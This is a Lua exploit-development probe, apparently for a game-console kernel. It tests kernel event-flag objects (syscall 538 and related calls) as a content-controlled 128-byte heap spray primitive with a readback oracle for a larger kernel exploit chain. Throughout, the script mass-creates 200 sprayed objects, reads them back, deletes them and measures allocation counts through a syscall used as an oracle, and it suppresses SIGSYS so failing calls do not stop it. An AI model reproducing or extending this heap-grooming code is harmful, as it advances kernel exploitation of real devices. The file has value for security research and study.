-- CRASH_CLASS: LOW
-- PROBE 74d: EVF (538) as 128B zone spray primitive
--
-- 69l measured EVF at ~118B → 128B UMA bucket — same zone as AIO entries.
-- If we can create many EVFs and read state back, we have a content-controlled
-- 128B spray with oracle for the prolapse chain.
--
-- Tests:
-- [A] Create EVFs with different init patterns, verify handles
-- [B] Read EVF state back (evf_set/evf_wait/evf_trywait?)
-- [C] Mass spray: create 200 EVFs, verify all handles valid
-- [D] Delete EVFs cleanly (evf_delete)
-- [E] 624 oracle: measure VM ops per EVF create

print("=== PROBE 74d: EVF SPRAY TEST ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

-- Ignore SIGSYS
local sa = memory.alloc(0x20)
wq(N(sa), uint64(1)); wd(N(sa) + 8, 0); wq(N(sa) + 16, uint64(0))
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)

-- ============================================================
-- [A] EVF CREATE with different init patterns
-- ============================================================
print("")
print("[A] EVF CREATE (sys 538)")
-- 538 evf_create(name, attr, init_pattern)
-- From 342a: 538 with attribute 0x100 registers a name
-- From 69l: EVF = ~118B → 128B bucket

-- Try various attribute/init combinations
local evf_handles = {}
local patterns = {0x00000000, 0xDEADBEEF, 0x12345678, 0xAAAAAAAA, 0x00000001}

for i, pat in ipairs(patterns) do
    local name_buf = memory.alloc(0x30)
    local name_str = string.format("evf_%02d", i)
    for j = 1, #name_str do
        pcall(function() memory.write_byte(N(name_buf) + j - 1, string.byte(name_str, j)) end)
    end
    pcall(function() memory.write_byte(N(name_buf) + #name_str, 0) end)

    local ret = nil
    pcall(function()
        ret = mk(538)(uint64(N(name_buf)), uint64(0x120), uint64(pat))
    end)
    local rv = ret and sgn(ret) or -999
    print(string.format("  create '%s' attr=0x120 init=0x%08X → ret=%d", name_str, pat, rv))
    if rv >= 0 then
        evf_handles[#evf_handles + 1] = {handle = rv, pattern = pat, name = name_str}
    end
end

-- Also try without name (anonymous EVF)
for i = 1, 3 do
    local ret = nil
    pcall(function()
        ret = mk(538)(uint64(0), uint64(0x20), uint64(0xBB000000 + i))
    end)
    local rv = ret and sgn(ret) or -999
    print(string.format("  create anon attr=0x20 init=0x%08X → ret=%d", 0xBB000000 + i, rv))
    if rv >= 0 then
        evf_handles[#evf_handles + 1] = {handle = rv, pattern = 0xBB000000 + i, name = "anon"}
    end
end

print(string.format("  total EVFs created: %d", #evf_handles))

-- ============================================================
-- [B] READ EVF STATE BACK
-- ============================================================
print("")
print("[B] EVF STATE READBACK")

-- sys 539 = evf_delete
-- sys 540 = evf_open (lookup by name)
-- sys 541 = evf_cancel
-- sys 542 = evf_wait
-- sys 543 = evf_trywait
-- sys 544 = procctl (different)
-- sys 545 = evf_set
-- sys 546 = evf_clear

-- Try evf_trywait(543): trywait(handle, pattern, mode, result_ptr)
-- mode: 0x01 = wait any, 0x02 = wait all, 0x10 = clear on match
local result_buf = memory.alloc(0x10)

for i, evf in ipairs(evf_handles) do
    -- Try trywait with mode=0x01 (wait any), same pattern we set
    wd(N(result_buf), 0xCCCCCCCC)
    wd(N(result_buf) + 4, 0xCCCCCCCC)
    local ret = nil
    pcall(function()
        ret = mk(543)(uint64(evf.handle), uint64(evf.pattern), uint64(0x01), uint64(N(result_buf)))
    end)
    local rv = ret and sgn(ret) or -999
    local r0 = rd(N(result_buf)) or 0xCCCCCCCC
    local r1 = rd(N(result_buf) + 4) or 0xCCCCCCCC
    print(string.format("  trywait h=%d pat=0x%08X → ret=%d result=0x%08X 0x%08X",
        evf.handle, evf.pattern, rv, r0, r1))
end

-- Try evf_set(545): set(handle, bits)
print("")
print("  Setting bits on first handle...")
if #evf_handles >= 1 then
    local h = evf_handles[1].handle
    local ret = nil
    pcall(function() ret = mk(545)(uint64(h), uint64(0xFF)) end)
    local rv = ret and sgn(ret) or -999
    print(string.format("  set h=%d bits=0xFF → ret=%d", h, rv))

    -- Now trywait to read it back
    wd(N(result_buf), 0xCCCCCCCC)
    pcall(function() ret = mk(543)(uint64(h), uint64(0xFF), uint64(0x01), uint64(N(result_buf))) end)
    rv = ret and sgn(ret) or -999
    local r0 = rd(N(result_buf)) or 0xCCCCCCCC
    print(string.format("  trywait h=%d pat=0xFF → ret=%d result=0x%08X", h, rv, r0))
end

-- ============================================================
-- [C] MASS SPRAY: create 200 EVFs
-- ============================================================
print("")
print("[C] MASS SPRAY")
repeat
if not alive() then print("  DEAD before mass spray"); break end

local spray_handles = {}
local spray_ok = 0
local spray_fail = 0

for i = 1, 200 do
    if not alive() then print("  DEAD at spray " .. i); break end
    local ret = nil
    pcall(function()
        ret = mk(538)(uint64(0), uint64(0x20), uint64(0xAA000000 + i))
    end)
    local rv = ret and sgn(ret) or -999
    if rv >= 0 then
        spray_handles[#spray_handles + 1] = rv
        spray_ok = spray_ok + 1
    else
        spray_fail = spray_fail + 1
        if spray_fail <= 3 then
            print(string.format("  spray %d FAIL: ret=%d", i, rv))
        end
    end
end
print(string.format("  created: %d  failed: %d", spray_ok, spray_fail))

if spray_ok >= 2 then
    print(string.format("  handle range: %d..%d", spray_handles[1], spray_handles[#spray_handles]))
end

-- ============================================================
-- [D] DELETE EVFs
-- ============================================================
print("")
print("[D] EVF DELETE (sys 539)")

-- Delete spray handles
local del_ok = 0
local del_fail = 0
for i = 1, #spray_handles do
    local ret = nil
    pcall(function() ret = mk(539)(uint64(spray_handles[i])) end)
    local rv = ret and sgn(ret) or -999
    if rv == 0 then del_ok = del_ok + 1
    else del_fail = del_fail + 1 end
end
print(string.format("  spray delete: %d ok, %d fail", del_ok, del_fail))

-- Delete initial handles
for i, evf in ipairs(evf_handles) do
    pcall(function() mk(539)(uint64(evf.handle)) end)
end

-- ============================================================
-- [E] 624 ORACLE: VM OPS PER EVF CREATE
-- ============================================================
print("")
print("[E] 624 ORACLE")
if not alive() then print("  DEAD"); break end

local sc624 = mk(624)
local before = nil
pcall(function() before = sc624(uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0)) end)
local v0 = N(before or 0)

local EVF_COUNT = 20
local test_handles = {}
for i = 1, EVF_COUNT do
    local ret = nil
    pcall(function() ret = mk(538)(uint64(0), uint64(0x20), uint64(i)) end)
    if ret and sgn(ret) >= 0 then
        test_handles[#test_handles + 1] = sgn(ret)
    end
end

local after = nil
pcall(function() after = sc624(uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0)) end)
local v1 = N(after or 0)
local delta = v1 - v0
print(string.format("  624 before=%d after=%d delta=%d (%d EVFs created)", v0, v1, delta, #test_handles))
if #test_handles > 0 then
    print(string.format("  delta/evf = %.1f", delta / #test_handles))
end

-- Cleanup
for i = 1, #test_handles do
    pcall(function() mk(539)(uint64(test_handles[i])) end)
end

until true
print("")
print("[SUMMARY]")
print(string.format("  EVFs created (initial): %d", #evf_handles))
print(string.format("  EVFs created (spray):   %d / 200", spray_ok))
print(string.format("  process: %s", alive() and "ALIVE" or "DEAD"))
print("")
print("=== 74d COMPLETE ===")
